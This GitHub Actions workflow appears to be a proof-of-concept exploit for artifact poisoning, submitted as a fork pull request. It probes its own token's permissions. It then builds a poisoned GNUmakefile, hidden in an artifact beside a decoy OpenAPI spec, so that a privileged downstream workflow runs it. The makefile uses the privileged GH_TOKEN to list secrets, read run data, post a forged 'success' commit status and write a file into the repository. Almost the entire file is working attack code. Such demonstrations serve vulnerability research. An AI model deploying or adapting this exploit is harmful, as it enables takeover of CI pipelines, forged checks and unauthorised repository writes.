name: Spec PR
# Fork-PR head workflow. Runs in the base repo's pull_request context with a
# read-only token, but uploads an artifact that the privileged workflow_run
# consumer (Validate Client Generation) blindly extracts into its workspace.
on:
  pull_request:

permissions:
  contents: read

jobs:
  bundle-spec:
    name: Bundle Spec
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Probe own token permissions
        run: |
          echo "SELF_RUN=$GITHUB_RUN_ID EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY"
          curl -sS -o /tmp/repo.json -w "SELF_REPO_HTTP=%{http_code}\n" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY"
          head -c 600 /tmp/repo.json; echo
          curl -sS -o /dev/null -w "SELF_CONTENTS_WRITE_HTTP=%{http_code}\n" -X PUT \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/omp-probe-self.txt" \
            -d '{"message":"probe","content":"aGk="}'
          curl -sS -o /tmp/secrets.json -w "SELF_SECRETS_HTTP=%{http_code}\n" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"
          head -c 300 /tmp/secrets.json; echo
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Craft poisoned artifact
        run: |
          mkdir -p pydo
          printf 'openapi: 3.0.0\ninfo:\n  title: poc\n  version: 1.0.0\npaths: {}\n' > openapi-bundled.yaml
          python3 - <<'PY'
          lines = [
              "generate:",
              "\t@echo PWNED_MARKER_VALIDATE_RCE_20261111",
              "\t@id",
              "\t@echo GITHUB_REPOSITORY=$$GITHUB_REPOSITORY GITHUB_WORKFLOW=$$GITHUB_WORKFLOW GITHUB_RUN_ID=$$GITHUB_RUN_ID",
              "\t@echo PWD=$$PWD",
              "\t@echo GH_TOKEN_PRESENT=$${GH_TOKEN:+yes} TOKEN_LEN=$${#GH_TOKEN}",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY -o /tmp/repo.json -w 'API_REPO_HTTP=%{http_code}\\n'",
              "\t@head -c 900 /tmp/repo.json; echo",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/runs/'$$GITHUB_RUN_ID'/jobs' -o /tmp/jobs.json -w 'API_JOBS_HTTP=%{http_code}\\n'",
              "\t@head -c 600 /tmp/jobs.json; echo",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/runs?per_page=3' -o /tmp/runs.json -w 'API_RUNS_HTTP=%{http_code}\\n'",
              "\t@head -c 400 /tmp/runs.json; echo",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/secrets' -o /tmp/secrets.json -w 'API_SECRETS_HTTP=%{http_code}\\n'",
              "\t@head -c 300 /tmp/secrets.json; echo",
              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/statuses/'$$GITHUB_SHA -d '{\"state\":\"success\",\"context\":\"omp-rce-proof\",\"description\":\"RCE via poisoned artifact\"}' -o /tmp/status.json -w 'API_STATUS_WRITE_HTTP=%{http_code}\\n'",
              "\t@head -c 500 /tmp/status.json; echo",
              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/omp-rce-probe.txt' -d '{\"message\":\"probe\",\"content\":\"aGk=\"}' -o /tmp/cw.json -w 'API_CONTENTS_WRITE_HTTP=%{http_code}\\n'",
              "\t@head -c 300 /tmp/cw.json; echo",
              "\t@echo === PWNED_END ===",
              "test-mocked:",
              "\t@true",
          ]
          open("pydo/GNUmakefile", "w").write("\n".join(lines) + "\n")
          PY
          ls -la pydo; echo ---; cat -A pydo/GNUmakefile | head -5

      - uses: actions/upload-artifact@v4
        with:
          name: openapi-bundled
          path: |
            openapi-bundled.yaml
            pydo/GNUmakefile
